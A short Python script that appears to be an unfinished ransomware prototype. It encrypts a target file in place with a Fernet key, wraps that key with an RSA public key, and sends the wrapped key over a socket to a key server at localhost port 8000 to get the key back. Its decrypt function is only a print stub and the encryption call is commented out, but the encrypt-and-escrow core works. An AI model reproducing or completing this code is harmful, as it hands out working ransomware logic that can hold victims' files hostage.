from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket

symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

def encryptFile():


    with open("public_key.key", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
                key_file.read(),
                backend=default_backend()
                )

    encryptedSymmetricKey = public_key.encrypt(
            symmetricKey,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
                )
            )
    with open("encryptedSymmetricKey.key", "wb") as key_file:
        key_file.write(encryptedSymmetricKey)

    filePath = "FileToEncrypt.txt"

    with open(filePath, "rb") as file:
        file_data = file.read()
        encrypted_data = FernetInstance.encrypt(file_data)

    with open(filePath, "wb") as file:
        file.write(encrypted_data)

    quit()

def decryptFile(filePath, key):
    print(f"file path: {filePath} ---- key: {key}")

def sendEncryptedKey(eKeyFilePath):
    HOST,PORT = "127.0.0.1", "8000"
    with socket.create_connection((HOST, PORT)) as sock:
        send_key = load_key()
        sock.send(send_key)
        get_key = sock.recv(1024).strip()
        return get_key

def load_key():
    return open("encryptedSymmetricKey.key", "rb").read()

def main():
    #encryptFile()
    encrypted_key = "encryptedSymmetricKey.key"
    filePath = "FileToEncrypt.txt"
    key = sendEncryptedKey(encrypted_key)

    decryptFile(filePath, key)

if __name__ == "__main__":
    main()
